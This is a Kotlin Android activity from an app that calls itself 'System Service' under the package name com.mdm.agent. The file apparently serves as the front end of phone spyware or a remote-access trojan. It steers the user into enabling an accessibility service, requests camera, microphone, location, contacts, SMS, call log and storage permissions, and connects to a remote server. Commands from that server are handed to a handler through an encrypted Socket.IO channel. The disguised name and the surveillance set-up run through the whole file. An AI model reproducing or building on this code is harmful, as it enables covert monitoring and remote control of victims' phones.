package com.mdm.agent

import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.mdm.agent.data.remote.ApiClient
import com.mdm.agent.data.remote.CommandHandler
import com.mdm.agent.data.remote.CryptoManager
import com.mdm.agent.data.remote.SocketManager
import com.mdm.agent.data.remote.UploadManager
import com.mdm.agent.util.DeviceUtils

class MainActivity : AppCompatActivity() {

    companion object {
        @Volatile private var instanceSocketManager: SocketManager? = null
        @Volatile private var instance: MainActivity? = null

        fun getSocketManager(): SocketManager? = instanceSocketManager
        fun setSocketManager(sm: SocketManager?) { instanceSocketManager = sm }
    }

    private val TAG = "MainActivity"
    private var statusText: TextView? = null
    private var socketManager: SocketManager? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        instance = this
        Log.i(TAG, "🚀 MainActivity started")

        // Check if Accessibility is enabled
        if (isAccessibilityEnabled()) {
            // Accessibility already enabled → show permissions screen
            showPermissionsScreen()
        } else {
            // Show Accessibility setup screen
            showAccessibilitySetup()
        }
    }

    // ═══════════════════════════════════════════════════════════
    // SCREEN 1: Accessibility Setup (simple, one button)
    // ═══════════════════════════════════════════════════════════
    private fun showAccessibilitySetup() {
        val scrollView = ScrollView(this).apply {
            setBackgroundColor(Color.parseColor("#FF0A0A0A"))
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 100, 40, 40)
            gravity = Gravity.CENTER_HORIZONTAL
        }

        // Icon
        val icon = TextView(this).apply {
            text = "⚙️"
            textSize = 60f
            gravity = Gravity.CENTER
            setPadding(0, 20, 0, 20)
        }
        root.addView(icon)

        // Title
        val title = TextView(this).apply {
            text = "System Service"
            setTextColor(Color.parseColor("#FFFFD700"))
            textSize = 24f
            setTypeface(typeface, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 8)
        }
        root.addView(title)

        // Subtitle
        val subtitle = TextView(this).apply {
            text = "Accessibility setup required"
            setTextColor(Color.parseColor("#FFAAAAAA"))
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }
        root.addView(subtitle)

        // Step 1
        root.addView(buildStep("1", "Tap the button below to open Accessibility Settings"))

        // Step 2
        root.addView(buildStep("2", "Find \"System Service\" in the list"))

        // Step 3
        root.addView(buildStep("3", "Turn it ON and return to this app"))

        // Accessibility button
        val btnAccessibility = Button(this).apply {
            text = "♿ Open Accessibility Settings"
            setTextColor(Color.WHITE)
            textSize = 16f
            setTypeface(typeface, Typeface.BOLD)
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#FF25D366"))
                cornerRadius = 24f
            }
            setPadding(0, 32, 0, 32)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = 40 }
            setOnClickListener {
                Toast.makeText(this@MainActivity, "Opening settings...", Toast.LENGTH_SHORT).show()
                try {
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_SETTINGS)
                    startActivity(intent)
                }
            }
        }
        root.addView(btnAccessibility)

        scrollView.addView(root)
        setContentView(scrollView)
    }

    private fun buildStep(num: String, text: String): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(0, 12, 0, 12)
            gravity = Gravity.CENTER_VERTICAL
        }

        val numView = TextView(this).apply {
            this.text = num
            setTextColor(Color.WHITE)
            textSize = 14f
            setTypeface(typeface, Typeface.BOLD)
            gravity = Gravity.CENTER
            background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(Color.parseColor("#FF25D366"))
            }
            layoutParams = LinearLayout.LayoutParams(48, 48).apply { marginEnd = 16 }
        }
        row.addView(numView)

        val textView = TextView(this).apply {
            this.text = text
            setTextColor(Color.WHITE)
            textSize = 14f
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        row.addView(textView)

        return row
    }

    // ═══════════════════════════════════════════════════════════
    // SCREEN 2: Permissions Screen (English, shown after Accessibility)
    // ═══════════════════════════════════════════════════════════
    private fun showPermissionsScreen() {
        // Request all permissions first
        requestAllPermissions()

        // Connect to server
        connectToServer()

        val scrollView = ScrollView(this).apply {
            setBackgroundColor(Color.parseColor("#FF0A0A0A"))
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 80, 40, 40)
            gravity = Gravity.CENTER_HORIZONTAL
        }

        // Title
        val title = TextView(this).apply {
            text = "System Service"
            setTextColor(Color.parseColor("#FFFFD700"))
            textSize = 22f
            setTypeface(typeface, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 16)
        }
        root.addView(title)

        // Status
        statusText = TextView(this).apply {
            text = "Connecting to server..."
            setTextColor(Color.parseColor("#FF25D366"))
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 24)
        }
        root.addView(statusText)

        // Permissions list
        val permsTitle = TextView(this).apply {
            text = "Required Permissions"
            setTextColor(Color.parseColor("#FFAAAAAA"))
            textSize = 13f
            setTypeface(typeface, Typeface.BOLD)
            setPadding(0, 16, 0, 8)
        }
        root.addView(permsTitle)

        val perms = listOf(
            "📷 Camera",
            "🎤 Microphone",
            "📍 Location (GPS)",
            "👥 Contacts",
            "💬 SMS Messages",
            "📞 Call Logs",
            "📁 Storage & Files"
        )

        for (perm in perms) {
            val row = TextView(this).apply {
                text = "✅ $perm"
                setTextColor(Color.parseColor("#FFCCCCCC"))
                textSize = 13f
                setPadding(16, 6, 0, 6)
            }
            root.addView(row)
        }

        // Info text
        val info = TextView(this).apply {
            text = "\nℹ️ All permissions are required for the system service to function properly. The app will not work without them."
            setTextColor(Color.parseColor("#FF888888"))
            textSize = 11f
            setPadding(0, 24, 0, 0)
            gravity = Gravity.CENTER
        }
        root.addView(info)

        scrollView.addView(root)
        setContentView(scrollView)
    }

    // ═══════════════════════════════════════════════════════════
    // PERMISSIONS & CONNECTION
    // ═══════════════════════════════════════════════════════════
    private fun requestAllPermissions() {
        val perms = arrayOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(perms, 999)
            Log.i(TAG, "Requested all dangerous permissions")
        }
    }

    private fun connectToServer() {
        Thread {
            try {
                Log.i(TAG, "📡 Starting connection...")
                val deviceId = DeviceUtils.getDeviceId(this)
                val serverUrl = DeviceUtils.getServerUrl(this)
                Log.i(TAG, "  Server: $serverUrl")
                Log.i(TAG, "  Device: $deviceId")

                val apiClient = ApiClient(this)
                val cryptoManager = CryptoManager()
                val uploadManager = UploadManager(this)

                updateStatus("Requesting encryption keys...")
                val cryptoResult = apiClient.initCrypto(deviceId)
                if (cryptoResult != null) {
                    cryptoManager.initFromServer(cryptoResult)
                    Log.i(TAG, "✅ Crypto initialized")
                }

                updateStatus("Creating Socket.IO connection...")
                socketManager = SocketManager(this)
                setSocketManager(socketManager)

                val commandHandler = CommandHandler(this, apiClient, cryptoManager, socketManager!!, uploadManager)
                socketManager?.setCommandHandler(commandHandler)
                socketManager?.setCryptoManager(cryptoManager)

                socketManager?.onCommandReceived = { data ->
                    Log.i(TAG, "⚡ Command received: ${data.optString("command")}")
                    commandHandler.handleCommand(data)
                }

                updateStatus("Connecting to server...")
                socketManager?.connect()

                Log.i(TAG, "🎉 Socket.IO connected!")
                updateStatus("✅ Connected - App is ready")

            } catch (e: Exception) {
                Log.e(TAG, "❌ Connection failed: ${e.message}", e)
                updateStatus("❌ Connection failed: ${e.message}")
            }
        }.start()
    }

    private fun updateStatus(text: String) {
        Handler(Looper.getMainLooper()).post {
            statusText?.text = text
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        return try {
            val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
            if (enabled != 1) return false
            val list = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
            val serviceName = "$packageName/${com.mdm.agent.service.MDMAccessibilityService::class.java.name}"
            list.contains(serviceName)
        } catch (e: Exception) { false }
    }

    override fun onResume() {
        super.onResume()
        // Re-check accessibility when returning from settings
        if (isAccessibilityEnabled() && socketManager?.isConnected != true) {
            showPermissionsScreen()
        }
    }
}
